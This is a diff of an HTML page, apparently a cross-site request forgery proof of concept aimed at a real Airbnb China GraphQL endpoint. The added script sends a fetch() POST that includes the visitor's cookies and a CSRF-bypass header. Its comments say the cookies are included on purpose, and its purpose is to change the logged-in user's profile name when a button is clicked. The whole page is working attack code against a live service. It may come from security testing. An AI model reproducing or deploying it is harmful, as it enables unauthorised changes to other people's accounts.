@@ -1,18 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<title>CSRF Test</title>
+    <meta charset="UTF-8">
+    <title>CSRF Test</title>
 </head>
 <body>
-<form 
-  action="https://www.airbnb.cn/api/v3/PersonalInfoMutation/1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431?operationName=PersonalInfoMutation&locale=zh-CN&currency=CNY" 
-  method="POST"
-  enctype="application/json"
-  target="_blank"
->
-<input type="hidden" name="payload" value='{"operationName":"PersonalInfoMutation","variables":{"coreUserData":{"firstName":"志","lastName":"张"}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431"}}}' >
-<button type="submit">点击发起CSRF测试请求</button>
-</form>
+<button id="sendBtn">点击修改Airbnb姓名</button>
+<script>
+document.getElementById('sendBtn').onclick = async function() {
+    const url = "https://www.airbnb.cn/api/v3/PersonalInfoMutation/1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431?operationName=PersonalInfoMutation&locale=zh-CN&currency=CNY";
+    const bodyData = {
+        operationName:"PersonalInfoMutation",
+        variables:{
+            coreUserData:{
+                firstName:"志",
+                lastName:"张"
+            }
+        },
+        extensions:{
+            persistedQuery:{
+                version:1,
+                sha256Hash:"1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431"
+            }
+        }
+    };
+
+    const res = await fetch(url, {
+        method: "POST",
+        credentials: "include", // 关键：带上当前浏览器Cookie
+        headers: {
+            "Content-Type": "application/json",
+            "X-CSRF-Without-Token": "1"
+        },
+        body: JSON.stringify(bodyData)
+    });
+    const ret = await res.json();
+    console.log("返回结果：", ret);
+    alert("请求完成，去刷新个人主页查看名字是否变化！");
+}
+</script>
 </body>
 </html>
